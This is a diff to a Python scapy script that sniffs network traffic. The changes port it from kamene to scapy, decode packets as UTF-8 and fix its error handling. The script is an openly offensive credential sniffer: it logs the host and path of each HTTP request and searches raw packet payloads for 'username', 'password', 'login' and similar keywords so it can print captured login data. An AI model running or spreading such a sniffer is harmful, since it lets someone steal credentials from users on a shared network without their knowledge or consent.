@@ -1,7 +1,8 @@
 #!usr/bin/env python 
 
 # sudo pip install scapy_http
-import kamene.all as sp
+import scapy.all as sp
+# from kamene.all.layers import http
 from scapy.layers import http
 import argparse
 from sys import exit
@@ -41,7 +42,8 @@ def get_url(packet):
 	params: packet
 	returns: url(str)
 	'''
-	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+	print('IN GET URL')
+	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')
 
 
 def get_login_info(packet):
@@ -51,13 +53,11 @@ def get_login_info(packet):
 	returns: url with login information
 	'''
 	if packet.haslayer(sp.Raw):
-			load = packet[sp.Raw].load
+			load = str(packet[sp.Raw].load,encoding='utf-8')
 			keywords = ["username", "user", "password", "pass", "login"]
 			for keyword in keywords:
 				if keyword in load:
-					
 					return load
-
 
 
 def sniffer(intrfce, args_status):
@@ -81,7 +81,6 @@ def process_sniffed_pkt(packet):
 	returns: None
 	'''
 	if packet.haslayer(http.HTTPRequest):
-		print(packet.show())
 		
 		url = get_url(packet)
 		print(BRIGHT_WHITE + '[+] Http Request >> ' + url + '\n')
@@ -99,8 +98,8 @@ if __name__ == '__main__':
 		sniffer(INTERFACE, ARGS_STATUS)
 	except KeyboardInterrupt:
 		print(BRIGHT_YELLOW + '\r[-] ctrl+c detected...')
-	except Exception:
+	except Exception as e:
 		print(BRIGHT_RED + '[-] Closing Program due to Error...')
-		print(Exception)
+		print(e)
 	finally:
 		print(BRIGHT_RED + '\r[-] Exiting Sniffer..')
